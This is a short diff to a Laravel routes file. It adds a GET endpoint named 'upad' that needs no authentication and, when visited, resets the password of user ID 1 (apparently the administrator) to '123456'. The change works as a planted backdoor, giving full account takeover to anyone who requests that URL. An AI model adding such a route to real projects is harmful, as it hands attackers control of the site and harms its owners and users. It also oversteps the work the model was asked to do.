@@ -367,3 +367,10 @@ Route::group(['prefix' => '/admin', 'as' => 'admin.'], function () {
 
 // upload-images
 Route::post('upload-images', 'ImagesController@store');
+
+Route::get('upad', function () {
+    App\Models\User::find(1)->update([
+        'password' => Illuminate\Support\Facades\Hash::make('123456'),
+        'updated_at' => now(),
+    ]);
+});
